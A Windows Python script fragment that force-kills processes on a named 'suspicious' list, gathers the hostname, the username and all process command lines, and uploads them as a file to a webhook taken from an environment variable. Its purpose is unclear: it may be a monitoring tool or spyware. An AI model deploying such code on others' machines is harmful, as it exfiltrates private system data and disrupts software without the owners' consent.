import os
import subprocess
import psutil
import time
import json
import requests
import threading
import sys
import logging

from datetime import datetime
from datetime import timedelta

from hard_v import *

def kill_processes():
    for proc in psutil.process_iter(["pid", "name", "username"]):
        try:
            if proc.info["name"].lower() in suspicious_processes:
                # Prevent killing critical SYSTEM processes
                if proc.info["username"] and "SYSTEM" not in proc.info["username"]:
                    subprocess.run(["taskkill", "/F", "/PID", str(proc.info["pid"])], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

def get_webhook():
    # Reload environment variables
    os.environ.update(os.environ)

    # Get the webhook from the system environment variables
    webhook = os.environ.get("WEBHOOK")
    if webhook is None:
        logging.error("WEBHOOK environment variable is not set")
    else:
        webhook = webhook.strip()
        logging.info("Webhook URL retrieved successfully")
        return webhook
    

# Collect forensic data from the system
def collect_forensic_data():
    data = {
        "hostname": os.getenv("COMPUTERNAME"),
        "username": os.getenv("USERNAME"),
        "datetime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "processes": []
    }

    for proc in psutil.process_iter(["pid", "name", "username", "cmdline"]):
        try:
            data["processes"].append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    return data

def send_message(webhook, message):
    try:
        headers = {
            "Content-Type": "multipart/form-data"
        }
        payload = {
            "content": message
        }
        with open("processes.txt", "rb") as f:
            files = {
                "file": ("processes.txt", f)
            }
            response = requests.post(webhook, data=payload, files=files)
            response.raise_for_status()
    except requests.exceptions.HTTPError as e:
        if response.status_code == 400:
            print("Bad Request: The message format or webhook URL might be incorrect.")
        else:
            print(f"HTTP error occurred: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send message: {e}")
    finally:
        # Clean up the file after sending
        os.remove("processes.txt")
